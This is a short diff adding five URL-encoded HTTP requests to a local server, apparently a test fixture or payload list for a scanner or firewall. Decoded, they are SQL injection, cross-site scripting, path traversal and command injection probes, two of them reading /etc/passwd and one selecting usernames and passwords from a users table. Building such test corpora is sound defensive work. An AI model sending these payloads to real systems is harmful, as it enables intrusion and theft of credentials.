@@ -1,0 +1,5 @@
+GET http://127.0.0.1:18081/?id=1%27%20OR%20%271%27%3D%271%27%20--%20
+GET http://127.0.0.1:18081/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+GET http://127.0.0.1:18081/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+GET http://127.0.0.1:18081/?cmd=%3Bcat%20%2Fetc%2Fpasswd
+GET http://127.0.0.1:18081/?u=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users
